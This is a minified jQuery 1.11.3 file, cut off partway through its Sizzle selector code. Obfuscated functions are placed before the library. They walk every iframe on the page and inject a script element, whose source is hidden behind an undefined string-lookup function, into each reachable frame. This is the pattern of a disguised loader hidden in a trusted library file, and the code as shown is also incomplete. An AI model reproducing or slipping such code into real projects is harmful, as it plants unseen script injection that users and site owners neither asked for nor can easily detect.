function _0x47de0a() {
    _0x197aca(document[_0xb4fe("0xe")](_0xb4fe("0x15")))
}
function _0x323533(e) {
    e[_0xb4fe("0xf")][_0xb4fe("0x11")][_0xb4fe("0x18")]("favre"),
    _0x47de0a()
}
function _0x197aca(e) {
    for (var t = 0; t < e.length; t++) {
        var n = e[t];
        try {
            if (!n[_0xb4fe("0x11")][_0xb4fe("0x1")](_0xb4fe("0x9")) && !n.classList[_0xb4fe("0x1")]("favre-ignore"))
                if (n[_0xb4fe("0x14")](_0xb4fe("0x7"), _0x323533), n[_0xb4fe("0xb")](_0xb4fe("0x7"), _0x323533), n[_0xb4fe("0x12")][_0xb4fe("0x10")].body)
                    if (n.contentWindow[_0xb4fe("0x10")][_0xb4fe("0x6")][_0xb4fe("0x8")]) {
                        n[_0xb4fe("0x11")][_0xb4fe("0xd")](_0xb4fe("0x9"));
                        var o = document[_0xb4fe("0x5")]("script");
                        o[_0xb4fe("0x2")]("id", _0xb4fe("0x4")),
                        o[_0xb4fe("0xc")] = _0xb4fe("0x0"),
                        n[_0xb4fe("0x12")][_0xb4fe("0x10")][_0xb4fe("0x17")](_0xb4fe("0x4")) || n[_0xb4fe("0x12")].document[_0xb4fe("0x3")][_0xb4fe("0x16")](o)
                    }
            _0x197aca(n[_0xb4fe("0xa")][_0xb4fe("0xe")](_0xb4fe("0x13")))
        } catch (i) {
            try {
                n.classList[_0xb4fe("0xd")]("favre")
            } catch (r) {}
        }
    }
}
!function(e, t) {
    "object" == typeof module && "object" == typeof module.exports ? module.exports = e.document ? t(e, !0) : function(e) {
        if (!e.document)
            throw new Error("jQuery requires a window with a document");
        return t(e)
    } : t(e)
}("undefined" != typeof window ? window : this, function(p, t) {
    function s(e) {
        var t = "length" in e && e.length,
            n = ie.type(e);
        return "function" !== n && !ie.isWindow(e) && (!(1 !== e.nodeType || !t) || ("array" === n || 0 === t || "number" == typeof t && 0 < t && t - 1 in e))
    }
    function o(e, n, o) {
        if (ie.isFunction(n))
            return ie.grep(e, function(e, t) {
                return !!n.call(e, t, e) !== o
            });
        if (n.nodeType)
            return ie.grep(e, function(e) {
                return e === n !== o
            });
        if ("string" == typeof n) {
            if (fe.test(n))
                return ie.filter(n, e, o);
            n = ie.filter(n, e)
        }
        return ie.grep(e, function(e) {
            return 0 <= ie.inArray(e, n) !== o
        })
    }
    function i(e, t) {
        for (; (e = e[t]) && 1 !== e.nodeType;)
            ;
        return e
    }
    function e(e) {
        var n = ye[e] = {};
        return ie.each(e.match(Se) || [], function(e, t) {
            n[t] = !0
        }), n
    }
    function n() {
        pe.addEventListener ? (pe.removeEventListener("DOMContentLoaded", l, !1), p.removeEventListener("load", l, !1)) : (pe.detachEvent("onreadystatechange", l), p.detachEvent("onload", l))
    }
    function l() {
        (pe.addEventListener || "load" === event.type || "complete" === pe.readyState) && (n(), ie.ready())
    }
    function c(e, t, n) {
        if (void 0 === n && 1 === e.nodeType) {
            var o = "data-" + t.replace(we, "-$1").toLowerCase();
            if ("string" == typeof (n = e.getAttribute(o))) {
                try {
                    n = "true" === n || "false" !== n && ("null" === n ? null : +n + "" === n ? +n : Ve.test(n) ? ie.parseJSON(n) : n)
                } catch (i) {}
                ie.data(e, t, n)
            } else
                n = void 0
        }
        return n
    }
    function u(e) {
        var t;
        for (t in e)
            if (("data" !== t || !ie.isEmptyObject(e[t])) && "toJSON" !== t)
                return !1;
        return !0
    }
    function d(e, t, n, o) {
        if (ie.acceptData(e)) {
            var i,
                r,
                a = ie.expando,
                s = e.nodeType,
                l = s ? ie.cache : e,
                c = s ? e[a] : e[a] && a;
            if (c && l[c] && (o || l[c].data) || void 0 !== n || "string" != typeof t)
                return c || (c = s ? e[a] = $.pop() || ie.guid++ : a), l[c] || (l[c] = s ? {} : {
                    toJSON: ie.noop
                }), ("object" == typeof t || "function" == typeof t) && (o ? l[c] = ie.extend(l[c], t) : l[c].data = ie.extend(l[c].data, t)), r = l[c], o || (r.data || (r.data = {}), r = r.data), void 0 !== n && (r[ie.camelCase(t)] = n), "string" == typeof t ? null == (i = r[t]) && (i = r[ie.camelCase(t)]) : i = r, i
        }
    }
    function f(e, t, n) {
        if (ie.acceptData(e)) {
            var o,
                i,
                r = e.nodeType,
                a = r ? ie.cache : e,
                s = r ? e[ie.expando] : ie.expando;
            if (a[s]) {
                if (t && (o = n ? a[s] : a[s].data)) {
                    ie.isArray(t) ? t = t.concat(ie.map(t, ie.camelCase)) : t in o ? t = [t] : t = (t = ie.camelCase(t)) in o ? [t] : t.split(" "),
                    i = t.length;
                    for (; i--;)
                        delete o[t[i]];
                    if (n ? !u(o) : !ie.isEmptyObject(o))
                        return
                }
                (n || (delete a[s].data, u(a[s]))) && (r ? ie.cleanData([e], !0) : ne.deleteExpando || a != a.window ? delete a[s] : a[s] = null)
            }
        }
    }
    function r() {
        return !0
    }
    function h() {
        return !1
    }
    function a() {
        try {
            return pe.activeElement
        } catch (p) {}
    }
    function g(e) {
        var t = He.split("|"),
            n = e.createDocumentFragment();
        if (n.createElement)
            for (; t.length;)
                n.createElement(t.pop());
        return n
    }
    function m(e, t) {
        var n,
            o,
            i = 0,
            r = typeof e.getElementsByTagName !== xe ? e.getElementsByTagName(t || "*") : typeof e.querySelectorAll !== xe ? e.querySelectorAll(t || "*") : void 0;
        if (!r)
            for (r = [], n = e.childNodes || e; null != (o = n[i]); i++)
                !t || ie.nodeName(o, t) ? r.push(o) : ie.merge(r, m(o, t));
        return void 0 === t || t && ie.nodeName(e, t) ? ie.merge([e], r) : r
    }
    function v(e) {
        Ne.test(e.type) && (e.defaultChecked = e.checked)
    }
    function T(e, t) {
        return ie.nodeName(e, "table") && ie.nodeName(11 !== t.nodeType ? t : t.firstChild, "tr") ? e.getElementsByTagName("tbody")[0] || e.appendChild(e.ownerDocument.createElement("tbody")) : e
    }
    function S(e) {
        return e.type = (null !== ie.find.attr(e, "type")) + "/" + e.type, e
    }
    function y(e) {
        var t = Je.exec(e.type);
        return t ? e.type = t[1] : e.removeAttribute("type"), e
    }
    function b(e, t) {
        for (var n, o = 0; null != (n = e[o]); o++)
            ie._data(n, "globalEval", !t || ie._data(t[o], "globalEval"))
    }
    function w(e, t) {
        if (1 === t.nodeType && ie.hasData(e)) {
            var n,
                o,
                i,
                r = ie._data(e),
                a = ie._data(t, r),
                s = r.events;
            if (s)
                for (n in delete a.handle, a.events = {}, s)
                    for (o = 0, i = s[n].length; o < i; o++)
                        ie.event.add(t, n, s[n][o]);
            a.data && (a.data = ie.extend({}, a.data))
        }
    }
    function x(e, t) {
        var n,
            o,
            i;
        if (1 === t.nodeType) {
            if (n = t.nodeName.toLowerCase(), !ne.noCloneEvent && t[ie.expando]) {
                for (o in (i = ie._data(t)).events)
                    ie.removeEvent(t, o, i.handle);
                t.removeAttribute(ie.expando)
            }
            "script" === n && t.text !== e.text ? (S(t).text = e.text, y(t)) : "object" === n ? (t.parentNode && (t.outerHTML = e.outerHTML), ne.html5Clone && e.innerHTML && !ie.trim(t.innerHTML) && (t.innerHTML = e.innerHTML)) : "input" === n && Ne.test(e.type) ? (t.defaultChecked = t.checked = e.checked, t.value !== e.value && (t.value = e.value)) : "option" === n ? t.defaultSelected = t.selected = e.defaultSelected : ("input" === n || "textarea" === n) && (t.defaultValue = e.defaultValue)
        }
    }
    function V(e, t) {
        var n,
            o = ie(t.createElement(e)).appendTo(t.body),
            i = p.getDefaultComputedStyle && (n = p.getDefaultComputedStyle(o[0])) ? n.display : ie.css(o[0], "display");
        return o.detach(), i
    }
    function C(e) {
        var t = pe,
            n = Qe[e];
        return n || ("none" !== (n = V(e, t)) && n || ((t = ((Ye = (Ye || ie("<iframe frameborder='0' width='0' height='0'/>")).appendTo(t.documentElement))[0].contentWindow || Ye[0].contentDocument).document).write(), t.close(), n = V(e, t), Ye.detach()), Qe[e] = n), n
    }
    function k(t, n) {
        return {
            get: function() {
                var e = t();
                return null != e ? e ? void delete this.get : (this.get = n).apply(this, arguments) : void 0
            }
        }
    }
    function E(e, t) {
        if (t in e)
            return t;
        for (var n = t.charAt(0).toUpperCase() + t.slice(1), o = t, i = dt.length; i--;)
            if ((t = dt[i] + n) in e)
                return t;
        return o
    }
    function I(e, t) {
        for (var n, o, i, r = [], a = 0, s = e.length; a < s; a++)
            (o = e[a]).style && (r[a] = ie._data(o, "olddisplay"), n = o.style.display, t ? (r[a] || "none" !== n || (o.style.display = ""), "" === o.style.display && Ee(o) && (r[a] = ie._data(o, "olddisplay", C(o.nodeName)))) : (i = Ee(o), (n && "none" !== n || !i) && ie._data(o, "olddisplay", i ? n : ie.css(o, "display"))));
        for (a = 0; a < s; a++)
            (o = e[a]).style && (t && "none" !== o.style.display && "" !== o.style.display || (o.style.display = t ? r[a] || "" : "none"));
        return e
    }
    function N(e, t, n) {
        var o = st.exec(t);
        return o ? Math.max(0, o[1] - (n || 0)) + (o[2] || "px") : t
    }
    function P(e, t, n, o, i) {
        for (var r = n === (o ? "border" : "content") ? 4 : "width" === t ? 1 : 0, a = 0; r < 4; r += 2)
            "margin" === n && (a += ie.css(e, n + ke[r], !0, i)),
            o ? ("content" === n && (a -= ie.css(e, "padding" + ke[r], !0, i)), "margin" !== n && (a -= ie.css(e, "border" + ke[r] + "Width", !0, i))) : (a += ie.css(e, "padding" + ke[r], !0, i), "padding" !== n && (a += ie.css(e, "border" + ke[r] + "Width", !0, i)));
        return a
    }
    function F(e, t, n) {
        var o = !0,
            i = "width" === t ? e.offsetWidth : e.offsetHeight,
            r = Ze(e),
            a = ne.boxSizing && "border-box" === ie.css(e, "boxSizing", !1, r);
        if (i <= 0 || null == i) {
            if (((i = et(e, t, r)) < 0 || null == i) && (i = e.style[t]), nt.test(i))
                return i;
            o = a && (ne.boxSizingReliable() || i === e.style[t]),
            i = parseFloat(i) || 0
        }
        return i + P(e, t, n || (a ? "border" : "content"), o, r) + "px"
    }
    function A(e, t, n, o, i) {
        return new A.prototype.init(e, t, n, o, i)
    }
    function _() {
        return setTimeout(function() {
            ft = void 0
        }), ft = ie.now()
    }
    function B(e, t) {
        var n,
            o = {
                height: e
            },
            i = 0;
        for (t = t ? 1 : 0; i < 4; i += 2 - t)
            o["margin" + (n = ke[i])] = o["padding" + n] = e;
        return t && (o.opacity = o.width = e), o
    }
    function H(e, t, n) {
        for (var o, i = (wt[t] || []).concat(wt["*"]), r = 0, a = i.length; r < a; r++)
            if (o = i[r].call(n, t, e))
                return o
    }
    function R(t, e, n) {
        var o,
            i,
            r,
            a,
            s,
            l,
            c,
            u = this,
            d = {},
            f = t.style,
            h = t.nodeType && Ee(t),
            p = ie._data(t, "fxshow");
        for (o in n.queue || (null == (s = ie._queueHooks(t, "fx")).unqueued && (s.unqueued = 0, l = s.empty.fire, s.empty.fire = function() {
            s.unqueued || l()
        }), s.unqueued++, u.always(function() {
            u.always(function() {
                s.unqueued--,
                ie.queue(t, "fx").length || s.empty.fire()
            })
        })), 1 === t.nodeType && ("height" in e || "width" in e) && (n.overflow = [f.overflow, f.overflowX, f.overflowY], "inline" === ("none" === (c = ie.css(t, "display")) ? ie._data(t, "olddisplay") || C(t.nodeName) : c) && "none" === ie.css(t, "float") && (ne.inlineBlockNeedsLayout && "inline" !== C(t.nodeName) ? f.zoom = 1 : f.display = "inline-block")), n.overflow && (f.overflow = "hidden", ne.shrinkWrapBlocks() || u.always(function() {
            f.overflow = n.overflow[0],
            f.overflowX = n.overflow[1],
            f.overflowY = n.overflow[2]
        })), e)
            if (i = e[o], St.exec(i)) {
                if (delete e[o], r = r || "toggle" === i, i === (h ? "hide" : "show")) {
                    if ("show" !== i || !p || void 0 === p[o])
                        continue;
                    h = !0
                }
                d[o] = p && p[o] || ie.style(t, o)
            } else
                c = void 0;
        if (ie.isEmptyObject(d))
            "inline" === ("none" === c ? C(t.nodeName) : c) && (f.display = c);
        else
            for (o in p ? "hidden" in p && (h = p.hidden) : p = ie._data(t, "fxshow", {}), r && (p.hidden = !h), h ? ie(t).show() : u.done(function() {
                ie(t).hide()
            }), u.done(function() {
                var e;
                for (e in ie._removeData(t, "fxshow"), d)
                    ie.style(t, e, d[e])
            }), d)
                a = H(h ? p[o] : 0, o, u),
                o in p || (p[o] = a.start, h && (a.end = a.start, a.start = "width" === o || "height" === o ? 1 : 0))
    }
    function L(e, t) {
        var n,
            o,
            i,
            r,
            a;
        for (n in e)
            if (i = t[o = ie.camelCase(n)], r = e[n], ie.isArray(r) && (i = r[1], r = e[n] = r[0]), n !== o && (e[o] = r, delete e[n]), (a = ie.cssHooks[o]) && "expand" in a)
                for (n in r = a.expand(r), delete e[o], r)
                    n in e || (e[n] = r[n], t[n] = i);
            else
                t[o] = i
    }
    function j(r, e, t) {
        var n,
            a,
            o = 0,
            i = xt.length,
            s = ie.Deferred().always(function() {
                delete l.elem
            }),
            l = function() {
                if (a)
                    return !1;
                for (var e = ft || _(), t = Math.max(0, c.startTime + c.duration - e), n = 1 - (t / c.duration || 0), o = 0, i = c.tweens.length; o < i; o++)
                    c.tweens[o].run(n);
                return s.notifyWith(r, [c, n, t]), n < 1 && i ? t : (s.resolveWith(r, [c]), !1)
            },
            c = s.promise({
                elem: r,
                props: ie.extend({}, e),
                opts: ie.extend(!0, {
                    specialEasing: {}
                }, t),
                originalProperties: e,
                originalOptions: t,
                startTime: ft || _(),
                duration: t.duration,
                tweens: [],
                createTween: function(e, t) {
                    var n = ie.Tween(r, c.opts, e, t, c.opts.specialEasing[e] || c.opts.easing);
                    return c.tweens.push(n), n
                },
                stop: function(e) {
                    var t = 0,
                        n = e ? c.tweens.length : 0;
                    if (a)
                        return this;
                    for (a = !0; t < n; t++)
                        c.tweens[t].run(1);
                    return e ? s.resolveWith(r, [c, e]) : s.rejectWith(r, [c, e]), this
                }
            }),
            u = c.props;
        for (L(u, c.opts.specialEasing); o < i; o++)
            if (n = xt[o].call(c, r, u, c.opts))
                return n;
        return ie.map(u, H, c), ie.isFunction(c.opts.start) && c.opts.start.call(r, c), ie.fx.timer(ie.extend(l, {
            elem: r,
            anim: c,
            queue: c.opts.queue
        })), c.progress(c.opts.progress).done(c.opts.done, c.opts.complete).fail(c.opts.fail).always(c.opts.always)
    }
    function M(r) {
        return function(e, t) {
            "string" != typeof e && (t = e, e = "*");
            var n,
                o = 0,
                i = e.toLowerCase().match(Se) || [];
            if (ie.isFunction(t))
                for (; n = i[o++];)
                    "+" === n.charAt(0) ? (n = n.slice(1) || "*", (r[n] = r[n] || []).unshift(t)) : (r[n] = r[n] || []).push(t)
        }
    }
    function O(t, i, r, a) {
        function s(e) {
            var o;
            return l[e] = !0, ie.each(t[e] || [], function(e, t) {
                var n = t(i, r, a);
                return "string" != typeof n || c || l[n] ? c ? !(o = n) : void 0 : (i.dataTypes.unshift(n), s(n), !1)
            }), o
        }
        var l = {},
            c = t === qt;
        return s(i.dataTypes[0]) || !l["*"] && s("*")
    }
    function D(e, t) {
        var n,
            o,
            i = ie.ajaxSettings.flatOptions || {};
        for (o in t)
            void 0 !== t[o] && ((i[o] ? e : n || (n = {}))[o] = t[o]);
        return n && ie.extend(!0, e, n), e
    }
    function U(e, t, n) {
        for (var o, i, r, a, s = e.contents, l = e.dataTypes; "*" === l[0];)
            l.shift(),
            void 0 === i && (i = e.mimeType || t.getResponseHeader("Content-Type"));
        if (i)
            for (a in s)
                if (s[a] && s[a].test(i)) {
                    l.unshift(a);
                    break
                }
        if (l[0] in n)
            r = l[0];
        else {
            for (a in n) {
                if (!l[0] || e.converters[a + " " + l[0]]) {
                    r = a;
                    break
                }
                o || (o = a)
            }
            r = r || o
        }
        return r ? (r !== l[0] && l.unshift(r), n[r]) : void 0
    }
    function W(e, t, n, o) {
        var i,
            r,
            a,
            s,
            l,
            c = {},
            u = e.dataTypes.slice();
        if (u[1])
            for (a in e.converters)
                c[a.toLowerCase()] = e.converters[a];
        for (r = u.shift(); r;)
            if (e.responseFields[r] && (n[e.responseFields[r]] = t), !l && o && e.dataFilter && (t = e.dataFilter(t, e.dataType)), l = r, r = u.shift())
                if ("*" === r)
                    r = l;
                else if ("*" !== l && l !== r) {
                    if (!(a = c[l + " " + r] || c["* " + r]))
                        for (i in c)
                            if ((s = i.split(" "))[1] === r && (a = c[l + " " + s[0]] || c["* " + s[0]])) {
                                !0 === a ? a = c[i] : !0 !== c[i] && (r = s[0], u.unshift(s[1]));
                                break
                            }
                    if (!0 !== a)
                        if (a && e["throws"])
                            t = a(t);
                        else
                            try {
                                t = a(t)
                            } catch (f) {
                                return {
                                    state: "parsererror",
                                    error: a ? f : "No conversion from " + l + " to " + r
                                }
                            }
                }
        return {
            state: "success",
            data: t
        }
    }
    function G(n, e, o, i) {
        var t;
        if (ie.isArray(e))
            ie.each(e, function(e, t) {
                o || Yt.test(n) ? i(n, t) : G(n + "[" + ("object" == typeof t ? e : "") + "]", t, o, i)
            });
        else if (o || "object" !== ie.type(e))
            i(n, e);
        else
            for (t in e)
                G(n + "[" + t + "]", e[t], o, i)
    }
    function z() {
        try {
            return new p.XMLHttpRequest
        } catch (t) {}
    }
    function J() {
        try {
            return new p.ActiveXObject("Microsoft.XMLHTTP")
        } catch (t) {}
    }
    function q(e) {
        return ie.isWindow(e) ? e : 9 === e.nodeType && (e.defaultView || e.parentWindow)
    }
    var $ = [],
        X = $.slice,
        Y = $.concat,
        K = $.push,
        Q = $.indexOf,
        Z = {},
        ee = Z.toString,
        te = Z.hasOwnProperty,
        ne = {},
        oe = "1.11.3",
        ie = function(e, t) {
            return new ie.fn.init(e, t)
        },
        re = /^[\s\uFEFF\xA0]+|[\s\uFEFF\xA0]+$/g,
        ae = /^-ms-/,
        se = /-([\da-z])/gi,
        le = function(e, t) {
            return t.toUpperCase()
        };
    ie.fn = ie.prototype = {
        jquery: oe,
        constructor: ie,
        selector: "",
        length: 0,
        toArray: function() {
            return X.call(this)
        },
        get: function(e) {
            return null != e ? e < 0 ? this[e + this.length] : this[e] : X.call(this)
        },
        pushStack: function(e) {
            var t = ie.merge(this.constructor(), e);
            return t.prevObject = this, t.context = this.context, t
        },
        each: function(e, t) {
            return ie.each(this, e, t)
        },
        map: function(n) {
            return this.pushStack(ie.map(this, function(e, t) {
                return n.call(e, t, e)
            }))
        },
        slice: function() {
            return this.pushStack(X.apply(this, arguments))
        },
        first: function() {
            return this.eq(0)
        },
        last: function() {
            return this.eq(-1)
        },
        eq: function(e) {
            var t = this.length,
                n = +e + (e < 0 ? t : 0);
            return this.pushStack(0 <= n && n < t ? [this[n]] : [])
        },
        end: function() {
            return this.prevObject || this.constructor(null)
        },
        push: K,
        sort: $.sort,
        splice: $.splice
    },
    ie.extend = ie.fn.extend = function(e) {
        var t,
            n,
            o,
            i,
            r,
            a,
            s = e || {},
            l = 1,
            c = arguments.length,
            u = !1;
        for ("boolean" == typeof s && (u = s, s = arguments[l] || {}, l++), "object" == typeof s || ie.isFunction(s) || (s = {}), l === c && (s = this, l--); l < c; l++)
            if (null != (r = arguments[l]))
                for (i in r)
                    t = s[i],
                    s !== (o = r[i]) && (u && o && (ie.isPlainObject(o) || (n = ie.isArray(o))) ? (n ? (n = !1, a = t && ie.isArray(t) ? t : []) : a = t && ie.isPlainObject(t) ? t : {}, s[i] = ie.extend(u, a, o)) : void 0 !== o && (s[i] = o));
        return s
    },
    ie.extend({
        expando: "jQuery" + (oe + Math.random()).replace(/\D/g, ""),
        isReady: !0,
        error: function(e) {
            throw new Error(e)
        },
        noop: function() {},
        isFunction: function(e) {
            return "function" === ie.type(e)
        },
        isArray: Array.isArray || function(e) {
            return "array" === ie.type(e)
        },
        isWindow: function(e) {
            return null != e && e == e.window
        },
        isNumeric: function(e) {
            return !ie.isArray(e) && 0 <= e - parseFloat(e) + 1
        },
        isEmptyObject: function(e) {
            var t;
            for (t in e)
                return !1;
            return !0
        },
        isPlainObject: function(e) {
            var t;
            if (!e || "object" !== ie.type(e) || e.nodeType || ie.isWindow(e))
                return !1;
            try {
                if (e.constructor && !te.call(e, "constructor") && !te.call(e.constructor.prototype, "isPrototypeOf"))
                    return !1
            } catch (s) {
                return !1
            }
            if (ne.ownLast)
                for (t in e)
                    return te.call(e, t);
            for (t in e)
                ;
            return void 0 === t || te.call(e, t)
        },
        type: function(e) {
            return null == e ? e + "" : "object" == typeof e || "function" == typeof e ? Z[ee.call(e)] || "object" : typeof e
        },
        globalEval: function(e) {
            e && ie.trim(e) && (p.execScript || function(e) {
                p.eval.call(p, e)
            })(e)
        },
        camelCase: function(e) {
            return e.replace(ae, "ms-").replace(se, le)
        },
        nodeName: function(e, t) {
            return e.nodeName && e.nodeName.toLowerCase() === t.toLowerCase()
        },
        each: function(e, t, n) {
            var o = 0,
                i = e.length,
                r = s(e);
            if (n) {
                if (r)
                    for (; o < i && !1 !== t.apply(e[o], n); o++)
                        ;
                else
                    for (o in e)
                        if (!1 === t.apply(e[o], n))
                            break
            } else if (r)
                for (; o < i && !1 !== t.call(e[o], o, e[o]); o++)
                    ;
            else
                for (o in e)
                    if (!1 === t.call(e[o], o, e[o]))
                        break;
            return e
        },
        trim: function(e) {
            return null == e ? "" : (e + "").replace(re, "")
        },
        makeArray: function(e, t) {
            var n = t || [];
            return null != e && (s(Object(e)) ? ie.merge(n, "string" == typeof e ? [e] : e) : K.call(n, e)), n
        },
        inArray: function(e, t, n) {
            var o;
            if (t) {
                if (Q)
                    return Q.call(t, e, n);
                for (o = t.length, n = n ? n < 0 ? Math.max(0, o + n) : n : 0; n < o; n++)
                    if (n in t && t[n] === e)
                        return n
            }
            return -1
        },
        merge: function(e, t) {
            for (var n = +t.length, o = 0, i = e.length; o < n;)
                e[i++] = t[o++];
            if (n != n)
                for (; void 0 !== t[o];)
                    e[i++] = t[o++];
            return e.length = i, e
        },
        grep: function(e, t, n) {
            for (var o = [], i = 0, r = e.length, a = !n; i < r; i++)
                !t(e[i], i) !== a && o.push(e[i]);
            return o
        },
        map: function(e, t, n) {
            var o,
                i = 0,
                r = e.length,
                a = [];
            if (s(e))
                for (; i < r; i++)
                    null != (o = t(e[i], i, n)) && a.push(o);
            else
                for (i in e)
                    null != (o = t(e[i], i, n)) && a.push(o);
            return Y.apply([], a)
        },
        guid: 1,
        proxy: function(e, t) {
            var n,
                o,
                i;
            return "string" == typeof t && (i = e[t], t = e, e = i), ie.isFunction(e) ? (n = X.call(arguments, 2), (o = function() {
                return e.apply(t || this, n.concat(X.call(arguments)))
            }).guid = e.guid = e.guid || ie.guid++, o) : void 0
        },
        now: function() {
            return +new Date
        },
        support: ne
    }),
    ie.each("Boolean Number String Function Array Date RegExp Object Error".split(" "), function(e, t) {
        Z["[object " + t + "]"] = t.toLowerCase()
    });
    var ce = function(n) {
        function y(e, t, n, o) {
            var i,
                r,
                a,
                s,
                l,
                c,
                u,
                d,
                f,
                h;
            if ((t ? t.ownerDocument || t : O) !== A && F(t), n = n || [], s = (t = t || A).nodeType, "string" != typeof e || !e || 1 !== s && 9 !== s && 11 !== s)
                return n;
            if (!o && B) {
                if (11 !== s && (i = Te.exec(e)))
                    if (a = i[1]) {
                        if (9 === s) {
                            if (!(r = t.getElementById(a)) || !r.parentNode)
                                return n;
                            if (r.id === a)
                                return n.push(r), n
                        } else if (t.ownerDocument && (r = t.ownerDocument.getElementById(a)) && j(t, r) && r.id === a)
                            return n.push(r), n
                    } else {
                        if (i[2])
                            return Q.apply(n, t.getElementsByTagName(e)), n;
                        if ((a = i[3]) && v.getElementsByClassName)
                            return Q.apply(n, t.getElementsByClassName(a)), n
                    }
                if (v.qsa && (!H || !H.test(e))) {
                    if (d = u = M, f = t, h = 1 !== s && e, 1 === s && "object" !== t.nodeName.toLowerCase()) {
                        for (c = C(e), (u = t.getAttribute("id")) ? d = u.replace(ye, "\\$&") : t.setAttribute("id", d), d = "[id='" + d + "'] ", l = c.length; l--;)
                            c[l] = d + g(c[l]);
                        f = Se.test(e) && p(t.parentNode) || t,
                        h = c.join(",")
                    }
                    if (h)
                        try {
                            return Q.apply(n, f.querySelectorAll(h)), n
                        } catch (b) {} finally {
                            u || t.removeAttribute("id")
                        }
                }
            }
            return E(e.replace(le, "$1"), t, n, o)
        }
        function o() {
            function n(e, t) {
                return o.push(e + " ") > x.cacheLength && delete n[o.shift()], n[e + " "] = t
            }
            var o = [];
            return n
        }
        function l(e) {
            return e[M] = !0, e
        }
        function i(e) {
            var t = A.createElement("div");
            try {
                return !!e(t)
            } catch (o) {
                return !1
            } finally {
                t.parentNode && t.parentNode.removeChild(t),
                t = null
            }
        }
        function e(e, t) {
            for (var n = e.split("|"), o = e.length; o--;)
                x.attrHandle[n[o]] = t
        }
        function c(e, t) {
            var n = t && e,
                o = n && 1 === e.nodeType && 1 === t.nodeType && (~t.sourceIndex || q) - (~e.sourceIndex || q);
            if (o)
                return o;
            if (n)
                for (; n = n.nextSibling;)
                    if (n === t)
                        return -1;
            return e ? 1 : -1
        }
        function t(t) {
            return function(e) {
                return "input" === e.nodeName.toLowerCase() && e.type === t
            }
        }
        function r(n) {
            return function(e) {
                var t = e.nodeName.toLowerCase();
                return ("input" === t || "button" === t) && e.type === n
            }
        }
        function a(a) {
            return l(function(r) {
                return r = +r, l(function(e, t) {
                    for (var n, o = a([], e.length, r), i = o.length; i--;)
                        e[n = o[i]] && (e[n] = !(t[n] = e[n]))
                })
            })
        }
        function p(e) {
            return e && "undefined" != typeof e.getElementsByTagName && e
        }
        function s() {}
        function g(e) {
            for (var t = 0, n = e.length, o = ""; t < n; t++)
                o += e[t].value;
            return o
        }
        function d(a, e, t) {
            var s = e.dir,
                l = t && "parentNode" === s,
                c = U++;
            return e.first ? function(e, t, n) {
                for (; e = e[s];)
                    if (1 === e.nodeType || l)
                        return a(e, t, n)
            } : function(e, t, n) {
                var o,
                    i,
                    r = [D, c];
                if (n) {
                    for (; e = e[s];)
                        if ((1 === e.nodeType || l) && a(e, t, n))
                            return !0
                } else
                    for (; e = e[s];)
                        if (1 === e.nodeType || l) {
                            if ((o = (i = e[M] || (e[M] = {}))[s]) && o[0] === D && o[1] === c)
                                return r[2] = o[2];
                            if ((i[s] = r)[2] = a(e, t, n))
                                return !0
                        }
            }
        }
        function f(i) {
            return 1 < i.length ? function(e, t, n) {
                for (var o = i.length; o--;)
                    if (!i[o](e, t, n))
                        return !1;
                return !0
            } : i[0]
        }
        function T(e, t, n) {
            for (var o = 0, i = t.length; o < i; o++)
                y(e, t[o], n);
            return n
        }
        function b(e, t, n, o, i) {
            for (var r, a = [], s = 0, l = e.length, c = null != t; s < l; s++)
                (r = e[s]) && (!n || n(r, o, i)) && (a.push(r), c && t.push(s));
            return a
        }
        function S(h, p, g, m, v, e) {
            return m && !m[M] && (m = S(m)), v && !v[M] && (v = S(v, e)), l(function(e, t, n, o) {
                var i,
                    r,
                    a,
                    s = [],
                    l = [],
                    c = t.length,
                    u = e || T(p || "*", n.nodeType ? [n] : n, []),
                    d = !h || !e && p ? u : b(u, s, h, n, o),
                    f = g ? v || (e ? h : c || m) ? [] : t : d;
                if (g && g(d, f, n, o), m)
                    for (i = b(f, l), m(i, [], n, o), r = i.length; r--;)
                        (a = i[r]) && (f[l[r]] = !(d[l[r]] = a));
                if (e) {
                    if (v || h) {
                        if (v) {
                            for (i = [], r = f.length; r--;)
                                (a = f[r]) && i.push(d[r] = a);
                            v(null, f = [], i, o)
                        }
                        for (r = f.length; r--;)
                            (a = f[r]) && -1 < (i = v ? ee(e, a) : s[r]) && (e[i] = !(t[i] = a))
                    }
                } else
                    f = b(f === t ? f.splice(c, f.length) : f),
                    v ? v(null, t, f, o) : Q.apply(t, f)
            })
        }
        function h(e) {
            for (var i, t, n, o = e.length, r = x.relative[e[0].type], a = r || x.relative[" "], s = r ? 1 : 0, l = d(function(e) {
                    return e === i
                }, a, !0), c = d(function(e) {
                    return -1 < ee(i, e)
                }, a, !0), u = [function(e, t, n) {
                    var o = !r && (n || t !== I) || ((i = t).nodeType ? l(e, t, n) : c(e, t, n));
                    return i = null, o
                }]; s < o; s++)
                if (t = x.relative[e[s].type])
                    u = [d(f(u), t)];
                else {
                    if ((t = x.filter[e[s].type].apply(null, e[s].matches))[M]) {
                        for (n = ++s; n < o && !x.relative[e[n].type]; n++)
                            ;
                        return S(1 < s && f(u), 1 < s && g(e.slice(0, s - 1).concat({
                            value: " " === e[s - 2].type ? "*" : ""
                        })).replace(le, "$1"), t, s < n && h(e.slice(s, n)), n < o && h(e = e.slice(n)), n < o && g(e))
                    }
                    u.push(t)
                }
            return f(u)
        }
        function u(m, v) {
            var T = 0 < v.length,
                S = 0 < m.length,
                e = function(e, t, n, o, i) {
                    var r,
                        a,
                        s,
                        l = 0,
                        c = "0",
                        u = e && [],
                        d = [],
                        f = I,
                        h = e || S && x.find.TAG("*", i),
                        p = D += null == f ? 1 : Math.random() || .1,
                        g = h.length;
                    for (i && (I = t !== A && t); c !== g && null != (r = h[c]); c++) {
                        if (S && r) {
                            for (a = 0; s = m[a++];)
                                if (s(r, t, n)) {
                                    o.push(r);
                                    break
                                }
                            i && (D = p)
                        }
                        T && ((r = !s && r) && l--, e && u.push(r))
                    }
                    if (l += c, T && c !== l) {
                        for (a = 0; s = v[a++];)
                            s(u, d, t, n);
                        if (e) {
                            if (0 < l)
                                for (; c--;)
                                    u[c] || d[c] || (d[c] = Y.call(o));
                            d = b(d)
                        }
                        Q.apply(o, d),
                        i && !e && 0 < d.length && 1 < l + v.length && y.uniqueSort(o)
                    }
                    return i && (D = p, I = f), u
                };
            return T ? l(e) : e
        }
        var m,
            v,
            x,
            w,
            V,
            C,
            k,
            E,
            I,
            N,
            P,
            F,
            A,
            _,
            B,
            H,
            R,
            L,
            j,
            M = "sizzle" + 1 * new Date,
            O = n.document,
            D = 0,
            U = 0,
            W = o(),
            G = o(),
